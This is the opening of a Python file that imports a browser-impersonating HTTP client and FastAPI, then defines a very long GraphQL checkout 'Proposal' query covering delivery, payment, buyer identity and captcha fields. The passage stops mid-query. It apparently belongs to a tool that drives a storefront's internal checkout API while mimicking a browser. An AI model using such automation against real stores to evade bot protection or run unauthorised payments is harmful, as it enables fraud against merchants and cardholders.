import asyncio
import json
import re
import random
import time
import os
import logging
import signal
import hashlib
import contextvars
from collections import deque, Counter
from typing import Optional, List, Dict, Any
from urllib.parse import urlparse, parse_qs
from contextlib import asynccontextmanager

from fastapi import FastAPI, Query, HTTPException, Request
from fastapi.responses import JSONResponse

from curl_cffi import requests as _curl_req
from curl_cffi.requests import AsyncSession as CurlSession
try:
    from curl_cffi.requests import RequestsError
except ImportError:
    from curl_cffi.requests.exceptions import RequestsError


# ============================================================
# Queries (fill these or rely on persisted IDs)
# ============================================================


QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{... on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}... on CheckpointDenied{redirectUrl __typename}... on Throttled{pollAfter queueToken pollUrl __typename}... on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml... on RemoveTermViolation{target __typename}... on AcceptNewTermViolation{target __typename}... on ConfirmChangeViolation{from to __typename}... on UnprocessableTermViolation{target __typename}... on UnresolvableTermViolation{target __typename}... on ApplyChangeViolation{target from{... on ApplyChangeValueInt{value __typename}... on ApplyChangeValueRemoval{value __typename}... on ApplyChangeValueString{value __typename}__typename}to{... on ApplyChangeValueInt{value __typename}... on ApplyChangeValueRemoval{value __typename}... on ApplyChangeValueString{value __typename}__typename}__typename}... on GenericError{__typename}... on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{... on FilledBuyerIdentityTerms{email phone customer{... on CustomerProfile{email __typename}... on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename... on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{... on DiscountAllocatedAllocationSet{__typename allocations{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{... on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on DiscountCodeTrigger{code __typename}... on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename... on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{... on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}... on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{... on CompleteDeliveryStrategy{handle __typename}... on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{... on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{... on IntIntervalConstraint{lowerBound upperBound __typename}... on IntValueConstraint{value __typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{... on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{... on MerchandiseLine{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on MerchandiseBundleLineComponent{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on MerchandiseLineComponentWithCapabilities{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{... on SourceProvidedMerchandise{__typename requiresShipping}... on ProductVariantMerchandise{__typename requiresShipping}... on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}... on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{... on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{... on MerchandisePropertyValueString{string:value __typename}... on MerchandisePropertyValueInt{int:value __typename}... on MerchandisePropertyValueFloat{float:value __typename}... on MerchandisePropertyValueBoolean{boolean:value __typename}... on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{... on LineComponentDiscountAllocation{allocation{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{... on PendingTerms{taskId pollDelay __typename}... on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{... on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{... on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}... on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{... on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{... on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{... on IntIntervalConstraint{lowerBound upperBound __typename}... on IntValueConstraint{value __typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{... on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}__typename}payment{... on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{... on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}... on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}... on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}... on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename... on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}... on WalletsPlatformConfiguration{name configurationParams __typename}... on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}... on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}... on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}... on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}... on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}... on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}... on AmazonPayClassicWalletConfig{__typename name orderingIndex}... on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{... on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}... on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}... on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}... on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}... on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{... on DepositPercentage{percentage __typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}poNumber merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{... on FilledBuyerIdentityTerms{customer{... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}... on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{... on SMSMarketingConsent{value __typename}... on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{... on FilledDutyTerms{totalDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tax{... on FilledTaxTerms{totalTaxAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{... on TargetAllLines{__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tip{tipSuggestions{... on TipSuggestion{__typename percentage amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{... on FilledTipTerms{tipLines{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{... on LocalizationExtension{fields{... on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{... on Captcha{provider challenge sitekey token __typename}... on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{... on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{... on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename... on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{... on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}... on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}... on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}... on PaypalWalletContent{paypalBillingAddress:billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}... on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}... on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode 